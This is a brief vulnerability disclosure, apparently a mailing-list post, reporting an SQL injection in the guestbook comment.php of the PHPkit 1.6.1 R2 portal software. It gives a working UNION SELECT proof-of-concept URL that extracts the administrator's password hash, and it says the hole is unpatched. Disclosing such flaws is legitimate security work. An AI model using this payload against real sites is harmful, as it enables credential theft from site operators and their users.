Pretty much the same, but for completeness... ;-)

QL Injection in PHPkit 1.6.1 R2
================================

Discovered on 09.01.2007 by yorn.


Description:
------------
http://www.phpkit.de/

PHPkit is a php/sql based portal software.


Problem:
--------

SQL Injection:
There are multiple SQL injections in PHPkit. Just check bugtraq.
I think that this is a "new" one, so here we go:

The "Gï¿½stebuch" is prone to a sql injection vulnerablility 
in comment.php. It is possible to gain access to the admin 
password hash:

POC:
comment.php&comcat=gb&subid=-1'%20UNION%20SELECT%201,1,1,1,1,1,user_pw,1%20from%20PHPKIT_USER_TABLE%20where%20%20user_id=1/*

Vendor Status:
--------------
Vendor has been informed on the date of discovery. Not patched yet.
